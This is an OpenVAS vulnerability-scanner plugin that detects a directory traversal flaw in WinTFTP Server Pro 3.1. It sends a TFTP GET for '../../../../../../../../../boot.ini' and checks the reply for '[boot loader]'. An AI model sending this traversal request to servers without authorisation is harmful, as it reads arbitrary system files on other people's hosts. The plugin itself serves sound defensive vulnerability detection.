###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wintftp_server_dir_trav_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# WinTFTP Server Pro Remote Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to read arbitrary files
  on the affected application.";
tag_affected = "WinTFTP Server pro version 3.1";
tag_insight = "The flaw is due to an error in handling 'GET' and 'PUT' requests which
  can be exploited to download arbitrary files from the host system.";
tag_solution = "No solution or patch is available as of 29th November 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.wintftp.com/";
tag_summary = "This host is running WinTFTP Server and is prone to directory traversal
  Vulnerability.";

if(description)
{
  script_id(902271);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-09 06:49:11 +0100 (Thu, 09 Dec 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_name("WinTFTP Server Pro Remote Directory Traversal Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for the directory traversal Vulnerability in WinTFTP Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/63048");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15427/");
  script_xref(name : "URL" , value : "http://bug.haik8.com/Remote/2010-11-09/1397.html");
  script_xref(name : "URL" , value : "http://ibootlegg.com/root/viewtopic.php?f=11&amp;t=15");
  script_xref(name : "URL" , value : "http://www.indetectables.net/foro/viewtopic.php?f=58&amp;t=27821&amp;view=print");
  exit(0);
}


## Check fot tftp service

include("tftp.inc");

port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Send directory traversal attack request
response = NULL;
response = tftp_get(port:port, path:"../../../../../../../../../boot.ini");
if(isnull(response)) {
  exit(0);
}

## Check contents of boot.ini in the response
if("[boot loader]" >< response)
{
  security_hole(port:port);
  exit(0);
}
